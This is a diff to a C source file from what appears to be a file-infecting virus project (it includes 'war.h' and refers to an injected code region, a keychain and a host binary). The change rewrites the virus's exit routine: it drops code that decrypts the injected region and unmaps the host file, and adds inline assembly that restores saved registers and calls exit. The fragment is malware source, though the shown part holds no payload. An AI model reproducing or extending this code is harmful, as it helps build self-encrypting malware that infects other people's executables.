@@ -1,58 +1,40 @@
 #include <war.h>
 
 ////////////////////////////////////////////////////////////////////////////////
-/// ASM VOLATILE
-////////////////////////////////////////////////////////////////////////////////
-
-__attribute__((always_inline)) static inline int _munmap(void *addr, size_t length)
-{
-	int ret = 0;
-
-	asm volatile
-	(
-		"mov rdi, %0\n"
-		"mov rsi, %1\n"
-
-		"mov rax, 0xb\n"
-		"syscall\n"
-		:
-		: "g"(addr), "g"(length)
-	);
-	asm volatile
-	(
-		"mov %0, eax\n"
-		: "=r"(ret)
-		:
-	);
-
-	return ret;
-}
-
-__attribute__((always_inline)) static inline void _fatal(int status)
-{
-	asm volatile
-	(
-		"mov edi, %0\n"
-
-		"mov rax, 0x3c\n"
-		"syscall\n"
-		:
-		: "g"(status)
-	);
-}
-
-////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void __exit(struct s_host *host, struct s_keychain *keychain, const enum e_context context)
+void __exit(void *stack)
 {
-	decrypt_right(keychain, (char *)injection, (void *)__exit - (void *)injection);
-
-	printf("%s\t\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
-
-	(void)keychain;
-	_munmap(host->header, host->filesize);
-
-	_fatal(0);
+	asm volatile
+	(
+	 	"mov rsp, %0\n"
+		:
+		: "g"(stack)
+	);
+	asm volatile
+	(
+	 	"pop r15\n"
+		"pop r14\n"
+		"pop r13\n"
+		"pop r12\n"
+		"pop r11\n"
+		"pop r10\n"
+		"pop r9\n"
+		"pop r8\n"
+		"pop rcx\n"
+		"pop rdx\n"
+		"pop rsi\n"
+		"pop rdi\n"
+		"pop rax\n"
+		"pop rbp\n"
+		"pop rsp\n"
+		"pop rbx\n"
+		"add rsp, 8\n"
+	);
+	asm volatile
+	(
+	 	"mov rax, 0x3c\n"
+		"syscall\n"
+	);
 }
